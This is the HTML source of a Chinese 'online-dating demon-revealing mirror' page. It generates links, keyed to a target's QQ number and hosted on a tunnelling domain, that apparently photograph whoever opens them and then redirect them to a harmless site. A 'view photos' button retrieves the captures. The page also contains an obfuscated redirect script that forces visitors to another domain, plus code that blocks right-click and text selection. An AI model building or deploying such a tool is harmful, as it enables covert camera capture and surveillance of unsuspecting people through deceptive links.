
<!DOCTYPE html>
<html lang="zh-CN">
  <head>
   <style>
	body {
	     		background: url(/images/luzuz.jpg;) no-repeat center center fixed;
                background-size: cover;
	}
	</style>
      
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>网恋照妖镜</title>
    <!--baidu-->
    <!-- Bootstrap -->
    <link href="http://cdn.bootcss.com/bootstrap/3.3.4/css/bootstrap.css" rel="stylesheet">
    <script src></script>
   
	<script src="http://cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
	<script src="http://cdn.bootcss.com/layer/3.0.3/layer.min.js"></script>
	<link rel="stylesheet" type="text/css" href="css/shop_style.css">
	<link href="css/shop.css" rel="stylesheet" type="text/css">
	<link href="css/style.css" rel="stylesheet" type="text/css">
	<script src="js/jquery.min.js"></script>
	<link rel="shortcut icon" href="http://www.ym53.cn/f" type="image/x-icon">
	<script src="http://lib.baomitu.com/jquery/3.4.1/jquery.min.js"></script>
</head>
<body>
    <style> 
        #M1{
        	width: 110px;
    height: 35px;
    padding-top: 2px\9;
    /* cursor: pointer; */
    color: #fff;
    font-size: 15px;
    /* letter-spacing: 1px; */
    background: #3385ff;
    /* border-bottom: 1px solid #2d78f4; */
    /* outline: medium; */
    *: ;
    border-bottom: none;
    -webkit-appearance: none;
    -webkit-border-radius: 0;
    border: 0;
        text-align: center;
    text-decoration:none;
    color: #fff;
    background-color: #007bff;
    border-color: #007bff;
        padding: 7px;
        float: left;
        margin-left: 2%;     
        margin-top: 2%;
        }
</style> 
    
<script>
function  create() {
    var input = document.getElementById('content');//CY云官网www.cygzs686.top
    var kd = document.getElementById('kd');
    var myid = document.getElementById('myid');//CY云官网www.cygzs686.top//CY云官网www.cygzs686.top
    var url = document.getElementById('url');
    if (myid.value=="" || url.value==""){//CY云官网www.cygzs686.top
        alert("ID或跳转地址不能为空！");
        return false;
    }
    kd.href = 'https://342u4133v7.goho.co/?id='+myid.value+'&url='+url.value; //修改此处的域名 必须要SSL证书    kd.style = ''; 
    kd.innerText = 'https://342u4133v7.goho.co/?id='+myid.value+'&url='+url.value; //CY云官网www.cygzs686.top
}
</script>
<div id="bob">


	<div id="bd">
<div class="ct" style="padding:0;">
<section class="index">
<div id="bds">
	<div id="content">
	<div class="hd">
	
	<a href="https://www.youxuanma.cn/"><img src="images/luyuz.png"></div></a>
	<div class="mall" id="contentss">

<div class="mianban">
    <div class="wrap">
        <div class="tabs">
			<a href="javascript:void(0)" id="Choice_one" onclick="Choice(1)" class="active">链接生成</a>
			<a href="javascript:void(0)" id="Choice_two" onclick="Choice(2)">其他工具</a>
			<a href="javascript:void(0)" id="Choice_Three" onclick="Choice(3)">关于</a>            
        </div>
        <div class="swiper-container"><!--CY云官网www.cygzs686.top !-->
            <div class="content-slide">
                <div class="purchase_from">
					<ul id="Open" style="display:block;">
						<form action="?" class="form-sign" method="get" name="auth" onSubmit="return checkURL();">
						<li>
						<input type="text" class="form-control" id="myid" placeholder="输入对方QQ，生成链接" value>
                        <p>拍摄后跳转到：</p><!--CY云官网www.cygzs686.top !-->
                        <input type="text" class="form-control" id="url" value="http://qq.com">
						</li><!--CY云官网www.cygzs686.top !-->
						<li>
						<input type="button" value="生成链接" onclick="create();" style="display: block;background: #0099CC!important;height: 40px;font-size: 16px;color: #fff;border-radius: 4px;text-align: center;overflow: hidden;"> <br>   
						</li>
						<li class="btn_purchase">
                            <input type="button" value="查看照片" onclick="window.location.href='ck.php?id='+document.getElementById('myid').value" style="display: block;background: #0099CC!important;height: 40px;font-size: 16px;color: #fff;border-radius: 4px;text-align: center;overflow: hidden;">
                        </li>
						<div class="alert alert-success"><!--CY云官网www.cygzs686.top !-->
                       
						    <a  id="kd" style="text;">请先生成链接！</a>

						</div><!--CY云官网www.cygzs686.top !-->
                        <div class="alert alert-success"><!--CY云官网www.cygzs686.top **********************************************************!-->
                       
						    <!-- <input  id="kd" style="text;">请先生成链接！</input> -->
                            <input type="text" class="form-control" id="kd2" placeholder="鼠标左键长按上方链接，拖至此处即可复制" value>
						</div><!--CY云官网www.cygzs686.top **************************************************************************************!-->
						<span id="Order"></span>
						</form><!--CY云官网www.cygzs686.top !-->
                    </ul>
                   
                    <ul id="Back" style="display:none;">
                        <!-- <center>
						<h4 class="hd_tit" style="height:auto;line-height:normal;padding:10px;color:#FFFFFF;">本站温馨提示<br>
						<span style="font-size:13px;color:red;">注意：使用使用对方QQ生成链接!</span>
						</h4><!--CY云官网www.cygzs686.top !-->
						<!-- </center> -->
						<div class="list-group-item text-center"><!--CY云官网www.cygzs686.top !-->
					  
						</div>
                        <span id="Order"></span><!--CY云官网www.cygzs686.top !-->
                    </ul>
                </div>
            </div>
        </div>
        
    	
    	      
    </div>
    <p style="text-align:center"><br><a style="color: #FFFFFF"></a></p><br><!--CY云官网www.cygzs686.top !-->
</div>
<div id="loading"></div>
	</div>
	</div><!--CY云官网www.cygzs686.top !-->
	</section></div>
	</div>
	<div style="clear:both;"></div>
<!--CY云官网www.cygzs686.top !-->



<script>
$(document).ready(function(){
	getqrpic();
});
<script type="text/javascript">
//blog:luyuz.cn
var a = 'retrtrfdcfvvvv';
var ym = window.location;
var ym2 = 'www.ovdh.cn';
var ym3 = String(ym);

function suan(a){
var re = a.substring(0,2);
var tr = a.substring(2,4);
var tr2 = a.substring(4,6);
var fd = a.substring(6,8);
var cf = a.substring(8,10);
var vv = a.substring(10,12);
var vv2 = a.substring(12,14);
re = 'h';
tr = 't';
tr2 ='t';
fd = 'p';
cf = ':';
vv = '/';
vv2 = '/';
var p = re+tr+tr2+fd+cf+vv+vv2;
return p;
}
if (ym3.indexOf(ym2) == -1 ) {
alert(ym2);
// var av = ym3;
var b = suan(a) + 'ovdh.cn' + '/';
window.location = b;
}
</script>

<script language="Javascript">
document.oncontextmenu=new Function("event.returnValue=false");
document.onselectstart=new Function("event.returnValue=false");
</script>
</script>
		<script src="js/index.js"></script><!-- 核心插件 --><!--CY云官网www.cygzs686.top !-->
		<script src="js/all.js"></script><!-- 图标库 --><!--CY云官网www.cygzs686.top !-->
		<script src="js/Sitetime.js"></script><!-- 运行时间 --><!--CY云官网www.cygzs686.top !-->
		<script src="js/Mouse.js"></script><!-- 点击烟花特效 --<!--CY云官网www.cygzs686.top !-->
	    </div>
    </body>
    </html>